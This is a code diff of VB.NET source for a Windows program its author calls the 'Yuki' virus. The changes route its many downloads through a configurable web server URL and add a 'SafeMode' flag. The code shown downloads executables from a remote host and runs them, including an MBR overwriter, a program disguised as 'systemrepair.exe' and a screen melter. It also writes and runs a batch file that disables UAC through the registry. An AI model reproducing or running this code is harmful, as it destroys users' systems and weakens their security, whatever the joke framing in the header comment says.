@@ -9,8 +9,23 @@ Imports System.Threading
 Imports System.IO.Compression
 Imports System.Runtime.InteropServices
 Imports System.Diagnostics.Eventing.Reader
-
+'------------------------INFO------------------------
+' This virus was made by ZV800 as a fun  Codeing,
+' challenge. I did not make this to be the next,
+' dangerous computer virus
+'if you find a spreading routine in the program,
+'this is not the original version
+'------------------------INFO-----------------------
 Public Class Form1
+    '------------------------SETTINGS------------------------
+    Dim testing As Boolean = False ' bypasses all the payloads and all the code that makes it do stuff in case you wanted to test a particular form or smth like that.
+    Dim WebserverURL = "https://incomparable-cascaron-802b94.netlify.app" 'the link of the website that contains all of the necessary files that the program has to download,
+    'All of the files are at: https://github.com/zv800/Yuki/ if you want to set up your own web server
+    Dim SafeMode As Boolean = False ' if this will enable even if you click yes to enable destructive mode it will not enable destructive mode or harm your computer in any way
+    Dim disableUAC As Boolean = True 'if this is disabled it will not disable user account control because it makes the program practically useless otherwise as it asks,
+    'you to it run administrator every single time the program is ran (only disable this if you're testing it)
+    '------------------------SETTINGS------------------------
+
     Private Const SPI_SETDESKWALLPAPER As Integer = 20
     Private Const SPIF_UPDATEINIFILE As Integer = &H1
     Private Const SPIF_SENDWININICHANGE As Integer = &H2
@@ -51,7 +66,7 @@ Public Class Form1
     Dim download20 As Boolean = False
     Dim Check4BadFile As Boolean = False
     Dim download13 As Boolean = False
-    Dim testing As Boolean = False
+
     Dim des = fakememz
 
 
@@ -80,7 +95,14 @@ Public Class Form1
 
                                 sb.AppendLine("{true}")
                                 Try
-                                    IO.File.WriteAllText(Application.StartupPath & "\destructive.yuki3", sb.ToString())
+                                    If SafeMode = False Then
+                                        IO.File.WriteAllText(Application.StartupPath & "\destructive.yuki3", sb.ToString())
+                                    Else
+                                        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
+                                            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\destructive.yuki3")
+                                        End If
+                                    End If
+
                                 Catch ex2 As Exception
 
                                 End Try
@@ -122,16 +144,14 @@ Public Class Form1
             Wait2DisPros.RunWorkerAsync()
 
 
-
-            Dim sb3 As New System.Text.StringBuilder
-            sb3.AppendLine("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
-            sb3.AppendLine("exit")
-            sb3.AppendLine("del fuckUAC.cmd")
-            IO.File.WriteAllText("fuckUAC.cmd", sb3.ToString())
-            Process.Start("fuckUAC.cmd")
-
-
-
+            If disableUAC = True Then
+                Dim sb3 As New System.Text.StringBuilder
+                sb3.AppendLine("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+                sb3.AppendLine("exit")
+                sb3.AppendLine("del fuckUAC.cmd")
+                IO.File.WriteAllText("fuckUAC.cmd", sb3.ToString())
+                Process.Start("fuckUAC.cmd")
+            End If
 
             If My.Settings.infected = True Then
                 Dim sb As New System.Text.StringBuilder
@@ -175,7 +195,7 @@ Public Class Form1
             Try
                 download8 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/gdi.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
+            WebserverURL & "/gdi.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\gdi.exe")
 
             Catch ex As Exception
@@ -189,7 +209,7 @@ Public Class Form1
             Try
                 download15 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/Yuki3Antivirus.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
+            WebserverURL & "/Yuki3Antivirus.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
 
             Catch ex As Exception
@@ -198,7 +218,7 @@ Public Class Form1
             Try
                 download16 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/ERROR408.exe",
+            WebserverURL & "/ERROR408.exe",
             "C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
 
             Catch ex As Exception
@@ -208,7 +228,7 @@ Public Class Form1
             Try
                 download17 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/Main.db", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
+            WebserverURL & "/Main.db", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\Main.db")
 
             Catch ex As Exception
@@ -217,7 +237,7 @@ Public Class Form1
             Try
                 download14 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/play.vbs", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
+            WebserverURL & "/play.vbs", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\play.vbs")
 
             Catch ex As Exception
@@ -227,7 +247,7 @@ Public Class Form1
             Try
                 download8 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/yuki3.f.exe",
+           WebserverURL & "\yuki3.f.exe",
             "C:\Users\" & SystemInformation.UserName & "\yuki3.f.exe")
 
             Catch ex As Exception
@@ -248,7 +268,7 @@ Public Class Form1
             Try
                 download9 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
+             WebserverURL & "/DesktopGoose.zip", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
             "C:\Users\" & SystemInformation.UserName & "\DesktopGoose.zip")
 
             Catch ex As Exception
@@ -259,7 +279,7 @@ Public Class Form1
             Try
                 download9 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
+            WebserverURL & "/fake.memz.joke.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
             "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
 
             Catch ex As Exception
@@ -269,7 +289,7 @@ Public Class Form1
             Try
                 download1 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll", 'https://incomparable-cascaron-802b94.netlify.app/BluescreenSimulator.exe
+           WebserverURL & "/AxInterop.WMPLib.dll", 'https://incomparable-cascaron-802b94.netlify.app/BluescreenSimulator.exe
             "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
 
             Catch ex As Exception
@@ -279,7 +299,7 @@ Public Class Form1
             Try
                 download1 = True
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/338ryfhn2iyhrb2j.exe",
+            WebserverURL & "/338ryfhn2iyhrb2j.exe",
             "C:\Users\" & SystemInformation.UserName & "\338ryfhn2iyhrb2j.exe")
 
             Catch ex As Exception
@@ -289,7 +309,7 @@ Public Class Form1
             Try
 
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/beep2.wav",
+        WebserverURL & "/beep2.wav",
             "C:\Users\" & SystemInformation.UserName & "\beep2.wav")
 
             Catch ex As Exception
@@ -300,7 +320,7 @@ Public Class Form1
             Try
                 download2 = True
                 My.Computer.Network.DownloadFile(
-                   "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
+                WebserverURL & "/Interop.WMPLib.dll",
                   "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")
 
             Catch ex As Exception
@@ -310,7 +330,7 @@ Public Class Form1
             Try
 
                 My.Computer.Network.DownloadFile(
-                   "https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe",
+                 WebserverURL & "/Hoax.Win32.BadJoke.BlastBtn.a.exe",
                   "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
 
             Catch ex As Exception
@@ -322,7 +342,7 @@ Public Class Form1
             Try
                 download3 = True
                 My.Computer.Network.DownloadFile(
-                  "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
+               WebserverURL & "/welpyoutryed.exe",
                  "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
 
             Catch ex As Exception
@@ -334,7 +354,7 @@ Public Class Form1
                 download3 = True
 
                 My.Computer.Network.DownloadFile(
-         "https://incomparable-cascaron-802b94.netlify.app/monitoring-service.exe",
+       WebserverURL & "/monitoring-service.exe",
         "C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
             Catch ex As Exception
 
@@ -346,7 +366,7 @@ Public Class Form1
             Try
                 download6 = True
                 My.Computer.Network.DownloadFile(
-                "https://incomparable-cascaron-802b94.netlify.app/screen-melter.exe",
+              WebserverURL & "/screen-melter.exe",
                "C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
             Catch ex As Exception
 
@@ -747,7 +767,7 @@ Public Class Form1
                             Try
                                 download8 = True
                                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp", 'https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp
+            WebserverURL & "/wallpaper.bmp", 'https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp
             "C:\Users\" & SystemInformation.UserName & "\w.bmp")
                                 Try
                                     Dim bmp As New Bitmap("C:\Users\" & SystemInformation.UserName & "\w.bmp")
@@ -788,7 +808,7 @@ Public Class Form1
                             Try
                                 download8 = True
                                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/killpc.exe", 'https://incomparable-cascaron-802b94.netlify.app/killpc.exe
+          WebserverURL & "/killpc.exe", 'https://incomparable-cascaron-802b94.netlify.app/killpc.exe
             "C:\Users\" & SystemInformation.UserName & "\systemrepair.exe")
                                 Process.Start("C:\Users\" & SystemInformation.UserName & "\systemrepair.exe")
                             Catch ex As Exception
@@ -798,7 +818,7 @@ Public Class Form1
                             Try
                                 download8 = True
                                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/MbrOverwriter.exe", 'https://incomparable-cascaron-802b94.netlify.app/killpc.exe
+          WebserverURL & "/MbrOverwriter.exe", 'https://incomparable-cascaron-802b94.netlify.app/killpc.exe
             "C:\Users\" & SystemInformation.UserName & "\MbrOverwriter.exe")
                                 Process.Start("C:\Users\" & SystemInformation.UserName & "\MbrOverwriter.exe")
                             Catch ex As Exception
@@ -806,7 +826,7 @@ Public Class Form1
                             End Try
                             Try
                                 My.Computer.Network.DownloadFile(
-           "https://incomparable-cascaron-802b94.netlify.app/iexplore.exe", 'https://incomparable-cascaron-802b94.netlify.app/iexplore
+       WebserverURL & "/iexplore.exe", 'https://incomparable-cascaron-802b94.netlify.app/iexplore
           Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe")
                                 Dim sb As New System.Text.StringBuilder
 
@@ -1018,7 +1038,7 @@ Public Class Form1
             End Using
             Try
                 My.Computer.Network.DownloadFile(
-        "https://incomparable-cascaron-802b94.netlify.app/note.txt",
+      WebserverURL & "/note.txt",
        "C:\Users\" & SystemInformation.UserName & "\note.txt")
             Catch ex As Exception
 
@@ -1076,7 +1096,7 @@ Public Class Form1
                 If download1 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
+   WebserverURL & "/AxInterop.WMPLib.dll",
    "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1091,7 +1111,7 @@ Public Class Form1
                 If download17 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/ERROR408.exe",
+   WebserverURL & "/ERROR408.exe",
    "C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1109,7 +1129,7 @@ Public Class Form1
                 If download20 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/musicthing.wav",
+   WebserverURL & "/musicthing.wav",
    "C:\Users\" & SystemInformation.UserName & "\musicthing.wav")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1124,7 +1144,7 @@ Public Class Form1
                 If download19 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/MELTDOWN.wav",
+   WebserverURL & "/MELTDOWN.wav",
    "C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1140,7 +1160,7 @@ Public Class Form1
                 If download18 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/error.mp4",
+  WebserverURL & "/error.mp4",
    "C:\Users\" & SystemInformation.UserName & "\error.mp4")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1155,7 +1175,7 @@ Public Class Form1
                 If download15 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/Yuki3Antivirus.exe",
+   WebserverURL & "/Yuki3Antivirus.exe",
    "C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1170,7 +1190,7 @@ Public Class Form1
                 If download15 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/Main.db",
+ WebserverURL & "/Main.db",
    "C:\Users\" & SystemInformation.UserName & "\Main.db")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1185,7 +1205,7 @@ Public Class Form1
                 If download1 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
+  WebserverURL & "/Yuki3.Administrator.exe",
    "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1200,7 +1220,7 @@ Public Class Form1
                 If download8 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/gdi.exe",
+   WebserverURL & "/gdi.exe",
    "C:\Users\" & SystemInformation.UserName & "\gdi.exe")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1215,7 +1235,7 @@ Public Class Form1
                 If download13 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/uranidot.wav",
+  WebserverURL & "/uranidot.wav",
    "C:\Users\" & SystemInformation.UserName & "\uranidot.wav")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1229,7 +1249,7 @@ Public Class Form1
                 If download14 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/play.vbs",
+    WebserverURL & "/play.vbs",
    "C:\Users\" & SystemInformation.UserName & "\play.vbs")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1244,7 +1264,7 @@ Public Class Form1
                 If download9 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe",
+   WebserverURL & "/fake.memz.joke.exe",
    "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1259,7 +1279,7 @@ Public Class Form1
                 If download1 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe",
+  WebserverURL & "/Hoax.Win32.BadJoke.BlastBtn.a.exe",
    "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1274,7 +1294,7 @@ Public Class Form1
                 If download5 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
+  WebserverURL & "/346tr8Ge6.wav",
    "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1289,7 +1309,7 @@ Public Class Form1
                 If download12 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav",
+  WebserverURL & "/ohnotooload.wav",
    "C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1304,7 +1324,7 @@ Public Class Form1
                 If download6 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/screen-melter.exe",
+  WebserverURL & "/screen-melter.exe",
    "C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1319,7 +1339,7 @@ Public Class Form1
                 If download7 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
+  WebserverURL & "/whatthefuckimout.wav",
    "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1334,7 +1354,7 @@ Public Class Form1
                 If download2 = True Then
                     Try
                         My.Computer.Network.DownloadFile(
-               "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
+            WebserverURL & "/Interop.WMPLib.dll",
               "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")
                         Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                     Catch ex As Exception
@@ -1352,7 +1372,7 @@ Public Class Form1
             End If
             Try
                 My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
+          WebserverURL & "/welpyoutryed.exe",
             "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                 Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
             Catch ex As Exception
@@ -1413,7 +1433,7 @@ Public Class Form1
     Function runasadmin()
         Try
             My.Computer.Network.DownloadFile(
-          "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
+         WebserverURL & "/Yuki3.Administrator.exe",
          "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
 
         Catch ex As Exception
@@ -1435,7 +1455,7 @@ Public Class Form1
         Try
 
             My.Computer.Network.DownloadFile(
-    "https://incomparable-cascaron-802b94.netlify.app/Remove_Yuki_Virus.exe",
+    WebserverURL & "/Remove_Yuki_Virus.exe",
    "C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
 
         Catch ex As Exception
@@ -1694,7 +1714,7 @@ Public Class Form1
         Try
             download20 = True
             My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/musicthing.wav", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
+            WebserverURL & "/musicthing.wav", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\musicthing.wav")
 
         Catch ex As Exception
@@ -1703,7 +1723,7 @@ Public Class Form1
         Try
             download8 = True
             My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/hahau.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
+          WebserverURL & "/hahau.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
             "C:\Users\" & SystemInformation.UserName & "\hahau.wav")
 
         Catch ex As Exception
@@ -1713,7 +1733,7 @@ Public Class Form1
         Try
             download13 = True
             My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/uranidot.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
+           WebserverURL & "/uranidot.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
             "C:\Users\" & SystemInformation.UserName & "\uranidot.wav")
 
         Catch ex As Exception
@@ -1730,7 +1750,7 @@ Public Class Form1
         Try
             download19 = True
             My.Computer.Network.DownloadFile(
-                   "https://incomparable-cascaron-802b94.netlify.app/MELTDOWN.wav",
+                 WebserverURL & "/MELTDOWN.wav",
                   "C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav")
 
         Catch ex As Exception
@@ -1740,7 +1760,7 @@ Public Class Form1
         Try
             download5 = True
             My.Computer.Network.DownloadFile(
-            "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
+        WebserverURL & "/346tr8Ge6.wav",
            "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
         Catch ex As Exception
 
@@ -1751,7 +1771,7 @@ Public Class Form1
         Try
             download7 = True
             My.Computer.Network.DownloadFile(
-            "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
+          WebserverURL & "/whatthefuckimout.wav",
            "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
         Catch ex As Exception
 
@@ -1759,7 +1779,7 @@ Public Class Form1
         Try
             download12 = True
             My.Computer.Network.DownloadFile(
-         "https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav",
+      WebserverURL & "/ohnotooload.wav",
         "C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav")
 
         Catch ex As Exception
@@ -1767,7 +1787,7 @@ Public Class Form1
         Try
             download17 = True
             My.Computer.Network.DownloadFile(
-         "https://incomparable-cascaron-802b94.netlify.app/error.mp4",
+       WebserverURL & "/error.mp4",
         "C:\Users\" & SystemInformation.UserName & "\error.mp4")
 
         Catch ex As Exception
